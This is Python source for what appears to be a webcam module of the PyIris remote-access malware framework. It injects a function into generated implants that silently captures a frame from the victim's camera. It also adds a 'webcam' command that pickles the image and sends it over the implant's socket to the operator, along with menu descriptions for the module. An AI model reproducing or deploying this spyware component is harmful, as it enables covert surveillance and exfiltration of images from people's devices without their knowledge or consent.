# WEB + COM
# done
import library.modules.config as config
config.main()
interface = config.interface
if interface == "GUI":
    from flask import jsonify


def main(option):
    if option == 'generate':
        config.import_statements.append('import cv2')
        config.import_statements.append('from PIL import Image')
        config.import_statements.append('from io import BytesIO')
        config.import_statements.append('import pickle')
        config.functions.append('''
def webcam():
    cam = cv2.VideoCapture(0)
    retval, im = cam.read()
    cam.release()
    cv2.destroyAllWindows()
    im = cv2.cvtColor(im, cv2.COLOR_BGR2RGB)
    return im''')
        config.logics.append('''
            elif command == 'webcam':
                main_send(pickle.dumps(Image.fromarray(webcam())), s)''')
        config.help_menu[
            'webcam'] = 'Snaps a picture from the webcam and saves it as an in memory pickle before sending it to PyIris to decode and download'
    elif option == 'info':
        if interface == "GUI":
            return {
                "Name": "In-memory webcam component",
                "OS": "Linux",
                "Required Modules": "PIL (external), cv2 (external), io, pickle",
                "Commands": "webcam",
                "Description": "Snaps a picture from the webcam and saves it as an in memory pickle before sending it to PyIris to decode and download"
            }
        elif interface == "CUI":
            print('\nName             : In-memory webcam component' \
                  '\nOS               : Linux' \
                  '\nRequired Modules : PIL (external), cv2 (external), io, pickle' \
                  '\nCommands         : webcam' \
                  '\nDescription      : Snaps a picture from the webcam and saves it as an in memory pickle before sending it to PyIris to decode and download\n')
